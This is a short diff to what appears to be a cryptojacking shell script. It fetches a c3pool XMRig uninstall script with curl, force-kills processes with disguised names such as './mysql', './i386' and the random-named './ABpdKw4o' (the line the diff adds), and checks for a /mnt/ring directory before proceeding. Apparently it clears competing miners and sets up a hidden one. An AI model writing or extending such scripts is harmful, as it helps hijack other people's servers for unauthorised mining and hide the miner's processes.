@@ -5,7 +5,7 @@ curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/uninstall_c3pool_mi
 pkill -9 -f './mnt/ring/ring'
 pkill -9 -f './mysql'
 pkill -9 -f './i386'
-
+pkill -9 -f './ABpdKw4o'
 # 检查/mnt/ring目录是否存在，如果存在则跳过，如果不存在则执行
 if [ ! -d "/mnt/ring" ]; then
   cd /mnt
